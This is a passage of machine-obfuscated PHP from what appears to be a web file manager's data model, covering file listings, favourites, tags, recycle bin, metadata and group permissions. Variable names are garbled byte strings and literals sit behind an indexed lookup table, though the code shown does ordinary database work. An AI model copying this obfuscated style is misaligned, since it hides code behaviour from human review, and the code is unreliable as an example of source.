array(array("\155\x6f\144\x69\x66\x79\x54\151\155\x65", "\164\x69\155\145", "\x69\x6e\163\145\x72\x74", "\x66\165\156\143\x74\151\x6f\x6e"), array("\x63\x72\x65\141\164\x65\124\151\x6d\x65", "\x74\151\155\x65", "\x69\x6e\163\145\162\x74", "\x66\x75\156\143\164\x69\157\156"), array("\x76\151\x65\167\x54\151\155\145", "\164\x69\x6d\145", "\151\x6e\x73\x65\162\x74", "\146\x75\x6e\143\x74\151\x6f\156")); protected static $cacheSourceInfo = array(); protected static $cachePathInfo = array(); protected static $cacheFileInfo = array(); protected static $cacheChildList = array(); const TYPE_SYSTEM = 0; const TYPE_USER = 1; const TYPE_GROUP = 2; public function listData($§‹·»’˜) { return $this->listSource(array($_SERVER[¯µç›È¢][407] => $§‹·»’˜)); } public function typeName($¼•Ìíõ) { static $¢’Î©ñ = array(self::TYPE_SYSTEM => "\163\x79\x73\164\x65\155", self::TYPE_USER => "\x75\x73\x65\x72", self::TYPE_GROUP => "\147\162\157\165\x70"); return $¢’Î©ñ[$¼•Ìíõ . $_SERVER[¯µç›È¢][12]]; } public function sourceListInfo($Îê´ûö¿, $Ÿ•ôî“å = false) { $á¹ßÙ©Ì =& $_SERVER[¯µç›È¢]; $Îê´ûö¿ = $Îê´ûö¿ ? $Îê´ûö¿ : array(); $Îê´ûö¿ = array_filter(array_unique($Îê´ûö¿)); if (!$Îê´ûö¿) { return array(); } $Ç´£ Ë = $this->where(array($á¹ßÙ©Ì[408] => array($á¹ßÙ©Ì[7], $Îê´ûö¿)))->select(); $this->_listDataApply($Ç´£ Ë, $Ÿ•ôî“å); return array_to_keyvalue($Ç´£ Ë, $á¹ßÙ©Ì[408]); } public function pathInfoFilter(&$–ˆıÄ) { $ªîÄß¬ =& $_SERVER[¯µç›È¢]; static $×©÷’ÄÈ = false; static $²Ö¸  = false; static $‚ì‡Í” = false; if (!$×©÷’ÄÈ) { $êÕó­ûª = $ªîÄß¬[409]; $êÕó­ûª .= $ªîÄß¬[410]; $êÕó­ûª .= $ªîÄß¬[411]; $­Î˜·Ï¬ = $ªîÄß¬[412]; $½íÂ•ıã = explode($ªîÄß¬[50], $­Î˜·Ï¬); $×©÷’ÄÈ = explode($ªîÄß¬[50], $êÕó­ûª); $²Ö¸  = array(); foreach ($×©÷’ÄÈ as $’³†Ç¿›) { if (in_array($’³†Ç¿›, $½íÂ•ıã)) { continue; } $²Ö¸ [] = $’³†Ç¿›; } $‚ì‡Í” = explode($ªîÄß¬[50], $ªîÄß¬[413]); } foreach ($‚ì‡Í” as $³îşĞÎî) { if (isset($–ˆıÄ[$³îşĞÎî])) { $–ˆıÄ[$³îşĞÎî] = intval($–ˆıÄ[$³îşĞÎî]); } } $–ˆıÄ[$ªîÄß¬[88]] = $ªîÄß¬[414] . $–ˆıÄ[$ªîÄß¬[408]] . $ªîÄß¬[415]; $–ˆıÄ[$ªîÄß¬[33]] = $–ˆıÄ[$ªîÄß¬[416]] == 1 ? $ªîÄß¬[89] : $ªîÄß¬[206]; $–ˆıÄ[$ªîÄß¬[417]] = $this->typeName($–ˆıÄ[$ªîÄß¬[417]]); if ($–ˆıÄ[$ªîÄß¬[416]] != 1) { $–ˆıÄ[$ªîÄß¬[181]] = $–ˆıÄ[$ªîÄß¬[418]]; unset($–ˆıÄ[$ªîÄß¬[418]]); } $™÷ñ§Š = $×©÷’ÄÈ; if (isset($–ˆıÄ[$ªîÄß¬[419]]) && $–ˆıÄ[$ªîÄß¬[419]][$ªîÄß¬[420]] == -1) { $™÷ñ§Š = $²Ö¸ ; } $–ˆıÄ = array_field_key($–ˆıÄ, $™÷ñ§Š); return $–ˆıÄ; } public function listUserFav() { $òÄáÎÊİ =& $_SERVER[¯µç›È¢]; $Ì£Ò¬Ìƒ = Model($òÄáÎÊİ[421])->listData(); $‡³Ûµ· = array_filter_by_field($Ì£Ò¬Ìƒ, $òÄáÎÊİ[33], $òÄáÎÊİ[422]); $‡³Ûµ· = array_to_keyvalue($‡³Ûµ·, $òÄáÎÊİ[12], $òÄáÎÊİ[88]); if ($‡³Ûµ·) { $µ’æ£À = $this->listSource(array($òÄáÎÊİ[423] => array($òÄáÎÊİ[424], $‡³Ûµ·))); } $µ’æ£À = array_to_keyvalue($µ’æ£À[$òÄáÎÊİ[377]], $òÄáÎÊİ[408]); foreach ($Ì£Ò¬Ìƒ as &$°Ù¬ñÑì) { $°Ù¬ñÑì = array($òÄáÎÊİ[425] => $°Ù¬ñÑì[$òÄáÎÊİ[405]], $òÄáÎÊİ[426] => $°Ù¬ñÑì[$òÄáÎÊİ[32]], $òÄáÎÊİ[427] => $°Ù¬ñÑì[$òÄáÎÊİ[88]], $òÄáÎÊİ[428] => $°Ù¬ñÑì[$òÄáÎÊİ[33]], $òÄáÎÊİ[429] => $°Ù¬ñÑì[$òÄáÎÊİ[207]], $òÄáÎÊİ[430] => $°Ù¬ñÑì[$òÄáÎÊİ[96]]); if ($°Ù¬ñÑì[$òÄáÎÊİ[33]] == $òÄáÎÊİ[422] && $µ’æ£À[$°Ù¬ñÑì[$òÄáÎÊİ[88]]]) { $°Ù¬ñÑì[$òÄáÎÊİ[97]] = $µ’æ£À[$°Ù¬ñÑì[$òÄáÎÊİ[88]]]; } } unset($°Ù¬ñÑì); return $Ì£Ò¬Ìƒ; } public function listUserTag($¬ïì‚óõ) { $‹ø©ì± =& $_SERVER[¯µç›È¢]; if ($¬ïì‚óõ && !is_array($¬ïì‚óõ)) { $¬ïì‚óõ = array($¬ïì‚óõ); } $êêş±Ğ– = Model($‹ø©ì±[431])->listData(); $çéˆÖõ = array(); foreach ($êêş±Ğ– as $ãø¾¾Œ±) { $ÈŸÙÚİÒ = $ãø¾¾Œ±[$‹ø©ì±[88]]; if (!$ÈŸÙÚİÒ) { continue; } if (!isset($çéˆÖõ[$ÈŸÙÚİÒ])) { $çéˆÖõ[$ÈŸÙÚİÒ] = array(); } $çéˆÖõ[$ÈŸÙÚİÒ][] = $ãø¾¾Œ±[$‹ø©ì±[432]]; } $‰Ã÷Üœ® = array(); foreach ($çéˆÖõ as $¸âÜÅ¥Ã => $¶°ˆ•Öä) { $‡Ùß³« = !0; if (!$¬ïì‚óõ) { $‰Ã÷Üœ®[] = $¸âÜÅ¥Ã; continue; } foreach ($¬ïì‚óõ as $•úïæÓ) { if (!in_array($•úïæÓ, $¶°ˆ•Öä)) { $‡Ùß³« = !1; break; } } if ($‡Ùß³«) { $‰Ã÷Üœ®[] = $¸âÜÅ¥Ã; } } if (!$‰Ã÷Üœ®) { return array(); } $şùÑ““ = $this->listSource(array($‹ø©ì±[423] => array($‹ø©ì±[424], $‰Ã÷Üœ®))); if (!$şùÑ““ || count($‰Ã÷Üœ®) == $şùÑ““[$‹ø©ì±[374]][$‹ø©ì±[375]]) { return $şùÑ““; } $§ÊÂÈëĞ = array(); $å’ºÛÅÈ = array_to_keyvalue($şùÑ““[$‹ø©ì±[87]], $‹ø©ì±[12], $‹ø©ì±[408]); $Ü‡¢ĞÚÌ = array_to_keyvalue($şùÑ““[$‹ø©ì±[86]], $‹ø©ì±[12], $‹ø©ì±[408]); $Ìƒ®¤î¤ = array_merge($Ü‡¢ĞÚÌ, $å’ºÛÅÈ); foreach ($‰Ã÷Üœ® as $ÈŸÙÚİÒ) { if (!in_array($ÈŸÙÚİÒ, $Ìƒ®¤î¤)) { $§ÊÂÈëĞ[] = $ÈŸÙÚİÒ; } } if ($§ÊÂÈëĞ) { Model($‹ø©ì±[433])->removeBySource($§ÊÂÈëĞ); } return $şùÑ““; } public function listUserRecycle() { $«ãÕË =& $_SERVER[¯µç›È¢]; $£Ñë¾Úê = Model($«ãÕË[434])->listData(); if (!$£Ñë¾Úê) { return array(); } $…„„Æ¾ß = array($«ãÕË[423] => array($«ãÕË[424], $£Ñë¾Úê), $«ãÕË[435] => 1); return $this->listSource($…„„Æ¾ß); } public function listSource($šÙÌƒŒè, $æ‡ô´“æ = 3000, $ıäÕÄş± = false) { $ÙØªö‡ =& $_SERVER[¯µç›È¢]; if (!isset($šÙÌƒŒè[$ÙØªö‡[436]])) { $šÙÌƒŒè[$ÙØªö‡[436]] = 0; } $©¯˜ÎñÎ = $ÙØªö‡[437]; $Ÿ÷âíÛ‹ = $this->field($©¯˜ÎñÎ)->_makeOrder()->where($šÙÌƒŒè)->selectPage($æ‡ô´“æ); $this->_listPageCheck($Ÿ÷âíÛ‹, $©¯˜ÎñÎ, $šÙÌƒŒè); $this->_listDataApply($Ÿ÷âíÛ‹[$ÙØªö‡[377]], $ıäÕÄş±); $this->_listMake($Ÿ÷âíÛ‹); return $Ÿ÷âíÛ‹; } private function _listPageCheck(&$¥¢§åĞç, $İë„İóî, $íîâ™óù) { $‘¶ïÃàó =& $_SERVER[¯µç›È¢]; if (!is_array($¥¢§åĞç[$‘¶ïÃàó[374]])) { return; } $ÇàŠÊóı = $¥¢§åĞç[$‘¶ïÃàó[374]]; if ($ÇàŠÊóı[$‘¶ïÃàó[376]] <= 1) { return; } if ($ÇàŠÊóı[$‘¶ïÃàó[375]] >= 100000) { return; } if (Model($‘¶ïÃàó[438])->get($‘¶ïÃàó[439]) != $‘¶ïÃàó[440]) { return; } $İë„İóî = str_replace(array($‘¶ïÃàó[53], $‘¶ïÃàó[350], $‘¶ïÃàó[66]), $‘¶ïÃàó[12], $İë„İóî); $İë„İóî = $‘¶ïÃàó[441] . str_replace($‘¶ïÃàó[50], $‘¶ïÃàó[442], $İë„İóî) . $‘¶ïÃàó[443]; $ïŸÌà«ô = $‘¶ïÃàó[444]; $ïŸÌà«ô = $ïŸÌà«ô . $‘¶ïÃàó[445]; $êªïÊÈ = $ÇàŠÊóı[$‘¶ïÃàó[371]] * ($ÇàŠÊóı[$‘¶ïÃàó[361]] - 1) . $‘¶ïÃàó[50] . $ÇàŠÊóı[$‘¶ïÃàó[371]]; $¾ƒ¬Çª® = $this->_makeOrder(!0); $€ÃÂ†§ = $‘¶ïÃàó[441] . str_replace($‘¶ïÃàó[50], $‘¶ïÃàó[442], $¾ƒ¬Çª®[0]); if (strpos($€ÃÂ†§, $‘¶ïÃàó[446])) { $€ÃÂ†§ = str_replace($‘¶ïÃàó[446], $‘¶ïÃàó[447], $€ÃÂ†§); } else { $€ÃÂ†§ .= $‘¶ïÃàó[448] . $¾ƒ¬Çª®[1]; } $­ñİÔóÅ = array(); foreach ($íîâ™óù as $º×øæÀŞ => $ÜçÌÙá½) { $­ñİÔóÅ[$‘¶ïÃàó[441] . $º×øæÀŞ] = $ÜçÌÙá½; } $this->alias($‘¶ïÃàó[449])->field($İë„İóî)->limit($êªïÊÈ)->order($€ÃÂ†§); $…êì¿Ï = $this->join($ïŸÌà«ô)->where($­ñİÔóÅ)->select(); if ($…êì¿Ï) { $¥¢§åĞç[$‘¶ïÃàó[377]] = $…êì¿Ï; } } protected function _makeOrder($Ïü‰Œ« = false) { $‹õÉÁĞÑ =& $_SERVER[¯µç›È¢]; $§ïüö×ğ = Model($‹õÉÁĞÑ[450])->get($‹õÉÁĞÑ[451]); $«ë²ü… = Model($‹õÉÁĞÑ[450])->get($‹õÉÁĞÑ[452]); $áØ«º–µ = array($‹õÉÁĞÑ[453] => $‹õÉÁĞÑ[454], $‹õÉÁĞÑ[455] => $‹õÉÁĞÑ[456]); $ºø¡– = array($‹õÉÁĞÑ[32] => $‹õÉÁĞÑ[32], $‹õÉÁĞÑ[90] => $‹õÉÁĞÑ[90], $‹õÉÁĞÑ[181] => $‹õÉÁĞÑ[418], $‹õÉÁĞÑ[457] => $‹õÉÁĞÑ[457], $‹õÉÁĞÑ[458] => $‹õÉÁĞÑ[459], $‹õÉÁĞÑ[207] => $‹õÉÁĞÑ[207], $‹õÉÁĞÑ[96] => $‹õÉÁĞÑ[96]); $ş†ÇŠ® = Input::get($‹õÉÁĞÑ[460], $‹õÉÁĞÑ[7], $§ïüö×ğ, array_keys($ºø¡–)); $°ø¸¶° = Input::get($‹õÉÁĞÑ[461], $‹õÉÁĞÑ[7], $«ë²ü…, array_keys($áØ«º–µ)); if (!in_array($ş†ÇŠ®, array_keys($ºø¡–))) { $ş†ÇŠ® = $‹õÉÁĞÑ[32]; } if (!in_array($°ø¸¶°, array_keys($áØ«º–µ))) { $ş†ÇŠ® = $‹õÉÁĞÑ[453]; } if ($ş†ÇŠ® == $‹õÉÁĞÑ[32]) { } $áÈ¡‘™‚ = $‹õÉÁĞÑ[462] . $ºø¡–[$ş†ÇŠ®] . $‹õÉÁĞÑ[53] . $áØ«º–µ[$°ø¸¶°]; $áÈ¡‘™‚ = rtrim(trim($áÈ¡‘™‚), $‹õÉÁĞÑ[50]); if ($Ïü‰Œ«) { return array($áÈ¡‘™‚, $áØ«º–µ[$°ø¸¶°]); } return $this->order($áÈ¡‘™‚); } protected function _listDataApplyItem($¨ƒŸä£, $õ÷İ©¨ = false) { $ßÏ¦Ú†Ñ = array($¨ƒŸä£); $this->_listDataApply($ßÏ¦Ú†Ñ, $õ÷İ©¨); return $ßÏ¦Ú†Ñ[0]; } protected function _listDataApply(&$´µÇéëæ, $Á ¼í¼è = false) { $ø™¼Ôï =& $_SERVER[¯µç›È¢]; if (!$´µÇéëæ) { $´µÇéëæ = array(); return; } $ç±š¿ĞÄ = array_to_keyvalue($´µÇéëæ, $ø™¼Ôï[12], $ø™¼Ôï[408]); $ç±š¿ĞÄ = array_unique($ç±š¿ĞÄ); $this->_listSourceCache($´µÇéëæ); if (!$Á ¼í¼è) { $this->_listAppendMeta($´µÇéëæ, $ç±š¿ĞÄ); $this->_listAppendFileMeta($´µÇéëæ, $ç±š¿ĞÄ); $this->_listAppendChildren($´µÇéëæ, $ç±š¿ĞÄ); } $this->_listAppendPath($´µÇéëæ); $this->_listAppendAuth($´µÇéëæ); $this->_listAppendSourceInfo($´µÇéëæ, $ç±š¿ĞÄ); $this->_listAppendUser($´µÇéëæ); $this->_listFilterInfo($´µÇéëæ, $Á ¼í¼è); $this->_listAppendAuthSecret($´µÇéëæ); } protected function _listSourceCache($Êá Äı–) { $À§¹“œá =& $_SERVER[¯µç›È¢]; foreach ($Êá Äı– as $£çÍŒÎÁ) { self::$cacheSourceInfo[$À§¹“œá[463] . $£çÍŒÎÁ[$À§¹“œá[408]]] = $£çÍŒÎÁ; } } protected function _listFilterInfo(&$º„Ã´¹, $ÚîƒÏÀ = false) { $œ’ò†İÎ =& $_SERVER[¯µç›È¢]; foreach ($º„Ã´¹ as &$äì®Úï™) { $äì®Úï™ = $this->pathInfoFilter($äì®Úï™); self::$cachePathInfo[$œ’ò†İÎ[464] . intval($ÚîƒÏÀ) . $œ’ò†İÎ[465] . $äì®Úï™[$œ’ò†İÎ[408]]] = $äì®Úï™; } unset($äì®Úï™); } protected function _listMake(&$ÚıÀëÛÉ) { $Í—ù‘ÑÛ =& $_SERVER[¯µç›È¢]; $ÚıÀëÛÉ[$Í—ù‘ÑÛ[87]] = array(); $ÚıÀëÛÉ[$Í—ù‘ÑÛ[86]] = array(); foreach ($ÚıÀëÛÉ[$Í—ù‘ÑÛ[377]] as $É¥È¡Ö) { $“¿Ëº³§ = $É¥È¡Ö[$Í—ù‘ÑÛ[416]] == 1 ? $Í—ù‘ÑÛ[87] : $Í—ù‘ÑÛ[86]; $ÚıÀëÛÉ[$“¿Ëº³§][] = $É¥È¡Ö; } unset($ÚıÀëÛÉ[$Í—ù‘ÑÛ[377]]); } protected function _listAppendMeta(&$Öú×†, $°°¬òÑ÷) { $ÂùÍÙšá =& $_SERVER[¯µç›È¢]; $ŞÈÙ˜æ  = array($ÂùÍÙšá[423] => array($ÂùÍÙšá[424], $°°¬òÑ÷)); $ÌœÍ¸Ç = Model($ÂùÍÙšá[466])->field($ÂùÍÙšá[467])->where($ŞÈÙ˜æ )->select(); if (!$ÌœÍ¸Ç) { return; } $¤ƒÅÀÃò = array($ÂùÍÙšá[468], $ÂùÍÙšá[469], $ÂùÍÙšá[447]); $£…Ú¿ŞÉ = array(); foreach ($ÌœÍ¸Ç as $È¿†­Ò) { if (!isset($£…Ú¿ŞÉ[$È¿†­Ò[$ÂùÍÙšá[408]]])) { $£…Ú¿ŞÉ[$È¿†­Ò[$ÂùÍÙšá[408]]] = array(); } if (in_array($È¿†­Ò[$ÂùÍÙšá[105]], $¤ƒÅÀÃò)) { continue; } $£…Ú¿ŞÉ[$È¿†­Ò[$ÂùÍÙšá[408]]][$È¿†­Ò[$ÂùÍÙšá[105]]] = $È¿†­Ò[$ÂùÍÙšá[382]]; } foreach ($Öú×† as &$¢ôƒÑÌæ) { $¢ôƒÑÌæ[$ÂùÍÙšá[470]] = !1; if (isset($£…Ú¿ŞÉ[$¢ôƒÑÌæ[$ÂùÍÙšá[408]]])) { $¢ôƒÑÌæ[$ÂùÍÙšá[470]] = $£…Ú¿ŞÉ[$¢ôƒÑÌæ[$ÂùÍÙšá[408]]]; } if ($this->fileIsLock($¢ôƒÑÌæ) && $¢ôƒÑÌæ[$ÂùÍÙšá[419]]) { $Ÿ½Éòñ´ = AuthModel::AUTH_EDIT | AuthModel::AUTH_REMOVE; $¢ôƒÑÌæ[$ÂùÍÙšá[419]][$ÂùÍÙšá[420]] = AuthModel::authDisable($¢ôƒÑÌæ[$ÂùÍÙšá[419]][$ÂùÍÙšá[420]], $Ÿ½Éòñ´); $¢ôƒÑÌæ[$ÂùÍÙšá[419]][$ÂùÍÙšá[471]][$ÂùÍÙšá[419]] = $¢ôƒÑÌæ[$ÂùÍÙšá[419]][$ÂùÍÙšá[420]]; } } unset($¢ôƒÑÌæ); } protected function _listAppendFileMeta(&$¡¢Ş£¦Ë, $éÖÕ›Åè) { $­Ñü¦¯ =& $_SERVER[¯µç›È¢]; $ÇõÎµº« = array_to_keyvalue($¡¢Ş£¦Ë, $­Ñü¦¯[12], $­Ñü¦¯[472]); $ÇõÎµº« = array_filter(array_unique($ÇõÎµº«)); if (!$ÇõÎµº«) { return; } $õ¾ƒâ = array($­Ñü¦¯[473] => array($­Ñü¦¯[424], $ÇõÎµº«)); $Ø¤¡†ˆ™ = $­Ñü¦¯[474]; $°Ï‹Ì‹Î = Model($­Ñü¦¯[475])->field($Ø¤¡†ˆ™)->where($õ¾ƒâ)->select(); $°Ï‹Ì‹Î = array_to_keyvalue($°Ï‹Ì‹Î, $­Ñü¦¯[472]); $¼îğµÑ« = Model($­Ñü¦¯[476])->field($­Ñü¦¯[477])->where($õ¾ƒâ)->select(); $¼îğµÑ« = $¼îğµÑ« ? $¼îğµÑ« : array(); $»¼ôú¯ = array(); foreach ($¼îğµÑ« as $«˜ùŸã) { if (!isset($»¼ôú¯[$«˜ùŸã[$­Ñü¦¯[472]]])) { $»¼ôú¯[$«˜ùŸã[$­Ñü¦¯[472]]] = array(); } $»¼ôú¯[$«˜ùŸã[$­Ñü¦¯[472]]][$«˜ùŸã[$­Ñü¦¯[105]]] = $«˜ùŸã[$­Ñü¦¯[382]]; } foreach ($¡¢Ş£¦Ë as &$ÒØş£³ø) { $¤™â”³ë = $ÒØş£³ø[$­Ñü¦¯[472]]; if (!$¤™â”³ë || !is_array($°Ï‹Ì‹Î[$¤™â”³ë])) { continue; } $‹÷’õƒ¿ = $°Ï‹Ì‹Î[$¤™â”³ë]; $‹÷’õƒ¿[$­Ñü¦¯[90]] = $ÒØş£³ø[$­Ñü¦¯[90]]; $‹÷’õƒ¿[$­Ñü¦¯[32]] = $ÒØş£³ø[$­Ñü¦¯[32]]; if (!isset(self::$cacheFileInfo[$­Ñü¦¯[478] . $¤™â”³ë])) { self::$cacheFileInfo[$­Ñü¦¯[478] . $¤™â”³ë] = array_merge(array(), $‹÷’õƒ¿); } unset($°Ï‹Ì‹Î[$¤™â”³ë][$­Ñü¦¯[88]]); $àÏòÏÖ€ = is_array($»¼ôú¯[$¤™â”³ë]) ? $»¼ôú¯[$¤™â”³ë] : array(); $ÒØş£³ø[$­Ñü¦¯[177]] = array_merge($àÏòÏÖ€, $°Ï‹Ì‹Î[$¤™â”³ë]); if (isset($ÒØş£³ø[$­Ñü¦¯[177]][$­Ñü¦¯[176]])) { $ÒØş£³ø[$­Ñü¦¯[176]] = json_decode($ÒØş£³ø[$­Ñü¦¯[177]][$­Ñü¦¯[176]], !0); unset($ÒØş£³ø[$­Ñü¦¯[177]][$­Ñü¦¯[176]]); } } unset($ÒØş£³ø); } protected function _listAppendSourceInfo(&$‚‘”â´, $šÜ‘Ïè) { $º…¨¤¿¯ =& $_SERVER[¯µç›È¢]; if (!defined($º…¨¤¿¯[479])) { return; } $ö·íö = Model($º…¨¤¿¯[480])->listData(); $€æ«ÌÂ¥ = Model($º…¨¤¿¯[431])->listData(); $°ùİæÔ¹ = Model($º…¨¤¿¯[421])->listData(); $¥¶ğ€¢ß = Model($º…¨¤¿¯[481])->listSimple(); $ğıÖ …Å = array_to_keyvalue($ö·íö, $º…¨¤¿¯[405]); $í·äÆãö = array_to_keyvalue_group($€æ«ÌÂ¥, $º…¨¤¿¯[88], $º…¨¤¿¯[432]); $ïòıê†ë = array_to_keyvalue($°ùİæÔ¹, $º…¨¤¿¯[88]); $ëÑÓ²äæ = array_to_keyvalue_group($¥¶ğ€¢ß, $º…¨¤¿¯[408]); foreach ($‚‘”â´ as &$É“úƒ†¼) { $É“úƒ†¼[$º…¨¤¿¯[97]] = array($º…¨¤¿¯[482] => 0, $º…¨¤¿¯[483] => 0, $º…¨¤¿¯[484] => 0); if (isset($ïòıê†ë[$É“úƒ†¼[$º…¨¤¿¯[408]]])) { $É“úƒ†¼[$º…¨¤¿¯[97]][$º…¨¤¿¯[485]] = 1; $É“úƒ†¼[$º…¨¤¿¯[97]][$º…¨¤¿¯[486]] = $ïòıê†ë[$É“úƒ†¼[$º…¨¤¿¯[408]]][$º…¨¤¿¯[32]]; } if (isset($í·äÆãö[$É“úƒ†¼[$º…¨¤¿¯[408]]])) { $É“úƒ†¼[$º…¨¤¿¯[97]][$º…¨¤¿¯[487]] = array(); foreach ($í·äÆãö[$É“úƒ†¼[$º…¨¤¿¯[408]]] as $Ê«œ­ê) { $°Á®ıáú = $ğıÖ …Å[$Ê«œ­ê]; $É“úƒ†¼[$º…¨¤¿¯[97]][$º…¨¤¿¯[487]][] = array($º…¨¤¿¯[488] => $°Á®ıáú[$º…¨¤¿¯[405]], $º…¨¤¿¯[426] => $°Á®ıáú[$º…¨¤¿¯[32]], $º…¨¤¿¯[489] => $°Á®ıáú[$º…¨¤¿¯[490]]); } } if (isset($ëÑÓ²äæ[$É“úƒ†¼[$º…¨¤¿¯[408]]])) { $É“úƒ†¼[$º…¨¤¿¯[97]][$º…¨¤¿¯[491]] = array(); foreach ($ëÑÓ²äæ[$É“úƒ†¼[$º…¨¤¿¯[408]]] as $¶Ë”õË) { $É“úƒ†¼[$º…¨¤¿¯[97]][$º…¨¤¿¯[491]] = array($º…¨¤¿¯[492] => $¶Ë”õË[$º…¨¤¿¯[493]], $º…¨¤¿¯[494] => $¶Ë”õË[$º…¨¤¿¯[495]], $º…¨¤¿¯[496] => $¶Ë”õË[$º…¨¤¿¯[408]], $º…¨¤¿¯[497] => $¶Ë”õË[$º…¨¤¿¯[498]], $º…¨¤¿¯[499] => $¶Ë”õË[$º…¨¤¿¯[500]], $º…¨¤¿¯[501] => $¶Ë”õË[$º…¨¤¿¯[501]], $º…¨¤¿¯[502] => $¶Ë”õË[$º…¨¤¿¯[502]]); } } } unset($É“úƒ†¼); return $‚‘”â´; } protected function _listAppendChildren(&$É‘æ·‡Ø, $…û¬¬íÀ) { $áï¤³ˆª =& $_SERVER[¯µç›È¢]; $Ö»Õ«³é = array(); $¦ƒå¯È = array($áï¤³ˆª[216] => 0, $áï¤³ˆª[217] => 0); foreach ($É‘æ·‡Ø as &$×¯’–…Ç) { if (!$×¯’–…Ç[$áï¤³ˆª[416]]) { continue; } $Ö»Õ«³é[] = $×¯’–…Ç[$áï¤³ˆª[408]]; } unset($×¯’–…Ç); if (!$Ö»Õ«³é) { return; } $Òõì´†Ó = array($áï¤³ˆª[503] => array($áï¤³ˆª[7], $Ö»Õ«³é)); $ûİÎ÷¨ = array($áï¤³ˆª[503], $áï¤³ˆª[416], $áï¤³ˆª[504] => $áï¤³ˆª[505]); $íó¡Ã‚° = $this->field($ûİÎ÷¨)->where($Òõì´†Ó)->group($áï¤³ˆª[506])->select(); $‡ˆº˜şõ = array(); foreach ($íó¡Ã‚° as $Ó€âéÆ) { $×öÉÓËÅ = $Ó€âéÆ[$áï¤³ˆª[503]]; $ŠÍŞÒîÉ = $Ó€âéÆ[$áï¤³ˆª[416]] == $áï¤³ˆª[99] ? $áï¤³ˆª[217] : $áï¤³ˆª[216]; if (!isset($‡ˆº˜şõ[$×öÉÓËÅ])) { $‡ˆº˜şõ[$×öÉÓËÅ] = array($áï¤³ˆª[216] => 0, $áï¤³ˆª[217] => 0); } $‡ˆº˜şõ[$×öÉÓËÅ][$ŠÍŞÒîÉ] += $Ó€âéÆ[$áï¤³ˆª[505]]; } foreach ($É‘æ·‡Ø as &$×¯’–…Ç) { if (!$×¯’–…Ç[$áï¤³ˆª[416]]) { continue; } $¿ë°† = is_array($‡ˆº˜şõ[$×¯’–…Ç[$áï¤³ˆª[408]]]) ? $‡ˆº˜şõ[$×¯’–…Ç[$áï¤³ˆª[408]]] : $¦ƒå¯È; $×¯’–…Ç[$áï¤³ˆª[217]] = $¿ë°†[$áï¤³ˆª[217]]; $×¯’–…Ç[$áï¤³ˆª[216]] = $¿ë°†[$áï¤³ˆª[216]]; unset($×¯’–…Ç[$áï¤³ˆª[418]]); } unset($×¯’–…Ç); } protected function _listAppendAuth(&$½‚ÚÁ•ı) { $ËñóòËç =& $_SERVER[¯µç›È¢]; if (!defined($ËñóòËç[479])) { return; } $Æ¢ô‘Ú€ = array(); foreach ($½‚ÚÁ•ı as $Äşï¬Œ¦) { if ($Äşï¬Œ¦[$ËñóòËç[417]] == self::TYPE_GROUP) { $Æ¢ô‘Ú€[] = $Äşï¬Œ¦[$ËñóòËç[408]]; } } if (!$Æ¢ô‘Ú€) { return; } $ïÏÛê± = array_to_keyvalue($½‚ÚÁ•ı, $ËñóòËç[408]); $Ñô¥¦° = Model($ËñóòËç[507])->getSourceList($Æ¢ô‘Ú€, $ïÏÛê±); $ÙÔ¥û¹é = $GLOBALS[$ËñóòËç[508]] == 1; foreach ($½‚ÚÁ•ı as $ïæ£‡ÔÒ => &$Äşï¬Œ¦) { $Äşï¬Œ¦[$ËñóòËç[419]] = $Ñô¥¦°[$Äşï¬Œ¦[$ËñóòËç[408]]]; if (!$Äşï¬Œ¦[$ËñóòËç[419]] && $Äşï¬Œ¦[$ËñóòËç[417]] == self::TYPE_GROUP) { $Äşï¬Œ¦[$ËñóòËç[419]] = Action($ËñóòËç[509])->pathGroupAuthMake($Äşï¬Œ¦[$ËñóòËç[510]]); if (!$Äşï¬Œ¦[$ËñóòËç[419]] && !$ÙÔ¥û¹é) { $Äşï¬Œ¦[$ËñóòËç[209]] = !1; $Äşï¬Œ¦[$ËñóòËç[208]] = !1; } } if ($Äşï¬Œ¦[$ËñóòËç[419]]) { $Äşï¬Œ¦[$ËñóòËç[209]] = AuthModel::authCheckEdit($Äşï¬Œ¦[$ËñóòËç[419]][$ËñóòËç[420]]); $Äşï¬Œ¦[$ËñóòËç[208]] = AuthModel::authCheckView($Äşï¬Œ¦[$ËñóòËç[419]][$ËñóòËç[420]]); } $this->groupPathDisplay($Äşï¬Œ¦); } unset($Äşï¬Œ¦); } public function _listAppendAuthSecret(&$ÚôïØú³) { $¨­Ü¼ÊÍ =& $_SERVER[¯µç›È¢]; if (Model($¨­Ü¼ÊÍ[438])->get($¨­Ü¼ÊÍ[511]) != $¨­Ü¼ÊÍ[99]) { return; } static $Ÿı­Û¡Å = false; if (!$Ÿı­Û¡Å) { $— úÚ‰ñ = Model($¨­Ü¼ÊÍ[512]); $ƒ³˜Ö– = Model($¨­Ü¼ÊÍ[513]); $Ÿı­Û¡Å = $ƒ³˜Ö–->listData(); $Ÿı­Û¡Å = array_to_keyvalue($Ÿı­Û¡Å, $¨­Ü¼ÊÍ[408]); $úúó§’ = json_decode(Model($¨­Ü¼ÊÍ[438])->get($¨­Ü¼ÊÍ[514]), !0); $úúó§’ = array_to_keyvalue($úúó§’, $¨­Ü¼ÊÍ[405]); foreach ($Ÿı­Û¡Å as $üÈ‘ö© => $Åï«ò¼€) { $»æëÒ• = $úúó§’[$Åï«ò¼€[$¨­Ü¼ÊÍ[515]]]; if (!$»æëÒ•) { $ƒ³˜Ö–->remove($Åï«ò¼€[$¨­Ü¼ÊÍ[405]]); unset($Ÿı­Û¡Å[$üÈ‘ö©]); continue; } $¯£ò½¨˜ = $— úÚ‰ñ->listData($»æëÒ•[$¨­Ü¼ÊÍ[419]]); if (!$¯£ò½¨˜) { $ƒ³˜Ö–->remove($Åï«ò¼€[$¨­Ü¼ÊÍ[405]]); unset($Ÿı­Û¡Å[$üÈ‘ö©]); continue; } $Åï«ò¼€[$¨­Ü¼ÊÍ[419]] = $¯£ò½¨˜; $Åï«ò¼€[$¨­Ü¼ÊÍ[516]] = $»æëÒ•; $Åï«ò¼€[$¨­Ü¼ÊÍ[517]] = Model($¨­Ü¼ÊÍ[518])->getInfoSimpleOuter($Åï«ò¼€[$¨­Ü¼ÊÍ[457]]); $Ÿı­Û¡Å[$üÈ‘ö©] = $Åï«ò¼€; } } $ö£ÂóÔ = defined($¨­Ü¼ÊÍ[519]) ? USER_ID : $¨­Ü¼ÊÍ[12]; $ô«·£ëÛ = array(); $¦¯ã–öÓ = $this->_listAppendPath($ô«·£ëÛ, !0); foreach ($ÚôïØú³ as $üÈ‘ö© => &$Åï«ò¼€) { if 